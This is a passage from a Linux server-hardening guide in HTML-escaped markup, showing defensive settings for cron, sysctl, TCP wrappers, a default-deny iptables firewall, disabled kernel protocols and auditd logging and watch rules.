&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;tty1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/securetty
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;700 /root&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;enable-umask-077&quot;&gt;Enable UMASK 077&lt;/h2&gt;

&lt;p&gt;Can causes issues on systems where users share files:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;perl &lt;span class=&quot;nt&quot;&gt;-npe&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/umask\s+0\d2/umask 077/g'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; /etc/bashrc
perl &lt;span class=&quot;nt&quot;&gt;-npe&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/umask\s+0\d2/umask 077/g'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; /etc/csh.cshrc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;prune-idle-users&quot;&gt;Prune Idle Users&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Idle users will be removed after 15 minutes&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;readonly TMOUT=900&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/profile.d/os-security.sh
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;readonly HISTFILE&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/profile.d/os-security.sh
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x /etc/profile.d/os-security.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;securing-cron&quot;&gt;Securing Cron&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Locking down Cron&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /etc/cron.allow
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 /etc/cron.allow
&lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt; /etc/passwd | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; root &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/cron.deny
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Locking down AT&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /etc/at.allow
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 /etc/at.allow
&lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt; /etc/passwd | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; root &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/at.deny&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;sysctl-security&quot;&gt;Sysctl Security&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;/etc/sysctl.conf&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;net.ipv4.ip_forward &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
net.ipv4.conf.all.send_redirects &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
net.ipv4.conf.default.send_redirects &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
net.ipv4.tcp_max_syn_backlog &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1280
net.ipv4.icmp_echo_ignore_broadcasts &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
net.ipv4.conf.all.accept_source_route &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
net.ipv4.conf.all.accept_redirects &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
net.ipv4.conf.all.secure_redirects &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
net.ipv4.conf.all.log_martians &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
net.ipv4.conf.default.accept_source_route &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
net.ipv4.conf.default.accept_redirects &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
net.ipv4.conf.default.secure_redirects &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
net.ipv4.icmp_echo_ignore_broadcasts &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
net.ipv4.icmp_ignore_bogus_error_responses &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
net.ipv4.tcp_syncookies &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
net.ipv4.conf.all.rp_filter &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
net.ipv4.conf.default.rp_filter &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
net.ipv4.tcp_timestamps &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;deny-all-tcp-wrappers&quot;&gt;Deny All TCP Wrappers&lt;/h2&gt;

&lt;p&gt;TCP wrappers can provide a quick and easy method for controlling access to applications linked to them. Examples of TCP Wrapper aware applications are sshd, and portmap.&lt;/p&gt;

&lt;p&gt;Below commands block all but SSH:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ALL:ALL&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts.deny
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sshd:ALL&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts.allow&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;basic-iptables-firewall-rules&quot;&gt;Basic iptables Firewall Rules&lt;/h2&gt;

&lt;p&gt;Basic iptables Firewall rules, set to denyall as the default.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#Drop anything we aren't explicitly allowing. All outbound traffic is okay&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;filter
:INPUT DROP &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0:0]
:FORWARD DROP &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0:0]
:OUTPUT ACCEPT &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0:0]
:RH-Firewall-1-INPUT - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0:0]
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; RH-Firewall-1-INPUT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; FORWARD &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; RH-Firewall-1-INPUT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; RH-Firewall-1-INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; lo &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; RH-Firewall-1-INPUT &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; icmp &lt;span class=&quot;nt&quot;&gt;--icmp-type&lt;/span&gt; echo-reply &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; RH-Firewall-1-INPUT &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; icmp &lt;span class=&quot;nt&quot;&gt;--icmp-type&lt;/span&gt; destination-unreachable &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; RH-Firewall-1-INPUT &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; icmp &lt;span class=&quot;nt&quot;&gt;--icmp-type&lt;/span&gt; time-exceeded &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;c&quot;&gt;# Accept Pings&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; RH-Firewall-1-INPUT &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; icmp &lt;span class=&quot;nt&quot;&gt;--icmp-type&lt;/span&gt; echo-request &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;c&quot;&gt;# Log anything on eth0 claiming it's from a local or non-routable network&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# If you're using one of these local networks, remove it from the list below&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 10.0.0.0/8 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; LOG &lt;span class=&quot;nt&quot;&gt;--log-prefix&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IP DROP SPOOF A: &quot;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 172.16.0.0/12 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; LOG &lt;span class=&quot;nt&quot;&gt;--log-prefix&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IP DROP SPOOF B: &quot;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 192.168.0.0/16 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; LOG &lt;span class=&quot;nt&quot;&gt;--log-prefix&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IP DROP SPOOF C: &quot;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 224.0.0.0/4 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; LOG &lt;span class=&quot;nt&quot;&gt;--log-prefix&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IP DROP MULTICAST D: &quot;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 240.0.0.0/5 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; LOG &lt;span class=&quot;nt&quot;&gt;--log-prefix&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IP DROP SPOOF E: &quot;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 127.0.0.0/8 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; LOG &lt;span class=&quot;nt&quot;&gt;--log-prefix&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IP DROP LOOPBACK: &quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Accept any established connections&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; RH-Firewall-1-INPUT &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; ESTABLISHED,RELATED &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;c&quot;&gt;# Accept ssh traffic. Restrict this to known ips if possible.&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; RH-Firewall-1-INPUT &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; NEW &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 22 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;c&quot;&gt;#Log and drop everything else&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; RH-Firewall-1-INPUT &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; LOG
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; RH-Firewall-1-INPUT &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; DROP
COMMIT&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;verify-iptables-enabled&quot;&gt;Verify iptables Enabled&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;iptables
systemctl start iptables.service&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;disable-uncommon-protocols&quot;&gt;Disable Uncommon Protocols&lt;/h2&gt;

&lt;p&gt;The following Protocols will be disabled:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Datagram Congestion Control Protocol (DCCP)&lt;/li&gt;
  &lt;li&gt;Stream Control Transmission Protocol (SCTP)&lt;/li&gt;
  &lt;li&gt;Reliable Datagram Sockets (RDS)&lt;/li&gt;
  &lt;li&gt;Transparent Inter-Process Communication (TIPC)&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;install dccp /bin/false&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/modprobe.d/dccp.conf
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;install sctp /bin/false&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/modprobe.d/sctp.conf
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;install rds /bin/false&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/modprobe.d/rds.conf
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;install tipc /bin/false&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/modprobe.d/tipc.conf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;ensure-rsyslog-is-installed&quot;&gt;Ensure Rsyslog is installed&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;yum &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;rsyslog&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;enable-rsyslog&quot;&gt;Enable Rsyslog&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;rsyslog.service
systemctl start rsyslog.service&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;auditd---audit-daemon&quot;&gt;Auditd - Audit Daemon&lt;/h2&gt;

&lt;h3 id=&quot;enable-auditd-service&quot;&gt;Enable auditd Service&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;auditd.service
systemctl start auditd.service&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;audit-processes-which-start-prior-to-auditd&quot;&gt;Audit Processes Which Start Prior to auditd&lt;/h3&gt;

&lt;p&gt;Audit process which start before the Audit Daemon.&lt;/p&gt;

&lt;p&gt;Add the following line to &lt;code&gt;/etc/grub.conf&lt;/code&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;kernel /vmlinuz-version ro &lt;span class=&quot;nv&quot;&gt;vga&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ext &lt;span class=&quot;nv&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/VolGroup00/LogVol00 rhgb quiet &lt;span class=&quot;nv&quot;&gt;audit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;auditd-number-of-logs-retained&quot;&gt;Auditd Number of Logs Retained&lt;/h3&gt;

&lt;p&gt;Open &lt;code&gt;/etc/audit/auditd.conf&lt;/code&gt; and add or modify:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;num_logs &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 5&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;auditd-max-log-file-size&quot;&gt;Auditd Max Log File Size&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;max_log_file &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 30MB&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;auditd-max_log_file_action&quot;&gt;Auditd max_log_file_action&lt;/h3&gt;

&lt;p&gt;Open &lt;code&gt;/etc/audit/auditd.conf&lt;/code&gt; and set this to rotate.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;max_log_file_action &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; rotate&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;auditd-space_left&quot;&gt;Auditd space_left&lt;/h3&gt;

&lt;p&gt;Configure auditd to email you when space gets low, open &lt;code&gt;/etc/audit/auditd.conf&lt;/code&gt; and modify the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;space_left_action &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; email&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;auditd-admin_space_left&quot;&gt;Auditd admin_space_left&lt;/h3&gt;

&lt;p&gt;Configure auditd to halt when auditd log space is used up, forcing the system admin to rectify the space issue.&lt;/p&gt;

&lt;p&gt;On some systems where monitoring is less important another action could be leveraged.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;admin_space_left_action &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; halt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;auditd-mail_acct&quot;&gt;Auditd mail_acct&lt;/h3&gt;

&lt;p&gt;When space gets low auditd can send a email notification via email, to configure this and the following line to &lt;code&gt;/etc/audit/auditd.conf&lt;/code&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;action_mail_acct &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; root&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;configure-auditd-to-use-audispd-plugin&quot;&gt;Configure auditd to use audispd plugin&lt;/h3&gt;

&lt;p&gt;Auditd does not have the functionality to send logs directly to an external log server, however the audispd plugin pass audit records to the local syslog server, to enable this open &lt;code&gt;/etc/audisp/plugins.d/syslog.conf&lt;/code&gt; and set the active line to yes, then restart audispd daemon:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;service auditd restart&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;auditd-rules-etcauditauditrules&quot;&gt;Auditd Rules: /etc/audit/audit.rules&lt;/h3&gt;

&lt;p&gt;Open &lt;code&gt;/etc/audit/audit.rules&lt;/code&gt; and add the following lines to monitor various system files and activities:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# audit_time_rules - Record attempts to alter time through adjtime&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; adjtimex &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_time_rules

&lt;span class=&quot;c&quot;&gt;# audit_time_rules - Record attempts to alter time through settimeofday&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; settimeofday &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_time_rules

&lt;span class=&quot;c&quot;&gt;# audit_time_rules - Record Attempts to Alter Time Through stime&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; adjtimex &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; settimeofday &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; clock_settime
&lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_time_rules

&lt;span class=&quot;c&quot;&gt;# audit_time_rules - Record Attempts to Alter Time Through clock_settime&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; clock_settime &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_time_rules

&lt;span class=&quot;c&quot;&gt;# Record Attempts to Alter the localtime File&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /etc/localtime &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_time_rules

&lt;span class=&quot;c&quot;&gt;# Record Events that Modify User/Group Information&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# audit_account_changes&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /etc/group &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_account_changes
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /etc/passwd &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_account_changes
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /etc/gshadow &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_account_changes
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /etc/shadow &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_account_changes
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /etc/security/opasswd &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_account_changes

&lt;span class=&quot;c&quot;&gt;# Record Events that Modify the System's Network Environment&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# audit_network_modifications&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ARCH &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; sethostname &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; setdomainname &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_network_modifications
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /etc/issue &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_network_modifications
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /etc/issue.net &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_network_modifications
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /etc/hosts &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_network_modifications
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /etc/sysconfig/network &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; audit_network_modifications

&lt;span class=&quot;c&quot;&gt;#Record Events that Modify the System's Mandatory Access Controls&lt;/span&gt;
